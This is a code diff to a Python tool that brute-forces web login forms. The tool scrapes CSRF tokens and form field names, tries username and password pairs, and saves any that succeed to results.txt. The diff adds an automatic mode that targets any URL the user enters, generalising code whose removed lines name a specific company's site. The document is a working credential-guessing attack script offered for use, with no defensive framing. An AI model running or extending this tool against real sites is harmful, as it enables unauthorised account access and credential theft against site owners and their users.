@@ -3,8 +3,8 @@
 
 from app.settings import *
 import requests
-from sys import exit
 from lxml import html
+from sys import exit
 
 
 def presentation():
@@ -51,15 +51,17 @@ def process_request(request, user, password, failed_aftertry):
             print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
         else:
             if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
-                result = "\n--------------------------------------------------------------"
-                result += "\\OK!! \nTheese Credentials succeed:\n> user: " + user + " and password: " + password
-                result += "--------------------------------------------------------------"
+                result = "\n[+] --------------------------------------------------------------"
+                result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + user + " and " \
+                                                                                                          "password: " \
+                                                                                                          "" + password
+                result += "\n[+] --------------------------------------------------------------\n"
                 with open("./results.txt", "w+") as frr:
                     frr.write(result)
                 print(
                     "[+] A Match succeed 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                           "./results.txt")
-                return
+                exit()
             else:
                 print("Trying theese parameters: user: " + user + " and password: " + password)
 
@@ -69,13 +71,15 @@ def get_csrf_token(url, csrf_field):
     This method will fetch the token in the web-page and return it
     """
     # Get login _token
-    print("[+] Connecting to eneocameroon")
+    print("[+] Connecting to ", url)
     result = requests.get(url)
     tree = html.fromstring(result.text)
 
-    print("[+] Fetching token..")
-    _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
-    print("[+] _token: ", _token)
+    print("[+] Trying to Fetch a token..")
+    _token = ""
+    try:
+        _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
+    except Exception as es: pass
 
     return _token
 
@@ -144,25 +148,53 @@ def manual_mode():
     try_connection(url, user_field, password_field, csrf_field)
 
 
-def extract_field_form(html_contain):
+def extract_field_form(url, html_contain):
     """[summary]
 
     Arguments:
         html_contain {[type]} -- [description]
     """
     print("[+] Starting extraction...")
+    tree = html.fromstring(html_contain)
+
+    print("[+] Fetching parameters..")
+    form_action_url = list(tree.xpath("//form/@action"))[0]
+    payload_fetched = list(set(tree.xpath("//form//input")))
+
+    if len(form_action_url) == 0:
+        form_action_url = url
+
+    if "http" not in form_action_url:
+        form_action_url = url + form_action_url
+
+    print("[++] > action : ", form_action_url)
+    fields = []
+    for each_element in payload_fetched:
+        names = each_element.xpath("//@name")
+        types = each_element.xpath("//@type")
+
+        for i, name in enumerate(names):
+            if types[i] != "submit" and name != "submit":
+                print("[++] > ", str(name), "{" + str(types[i]) + "}")
+        fields = names
+        break
+
+    if len(fields) == 2:
+        fields.append("empty-token-field")
+
+    try_connection(url, fields[0], fields[1], fields[2])
 
 
 def automatic_mode():
     """[summary]
     """
-    print("[+ This option is not yet ready....]")
-    main()
-    # # Field's Form -------
-    # # The link of the website
-    # url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
-    # r = requests.get(url)
-    # extract_field_form(r.content)
+    print("[+] Starting the automatic mode...")
+    # Field's Form -------
+    # The link of the website
+    url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
+    r = requests.get(url)
+
+    extract_field_form(url, r.text)
 
 
 def main():
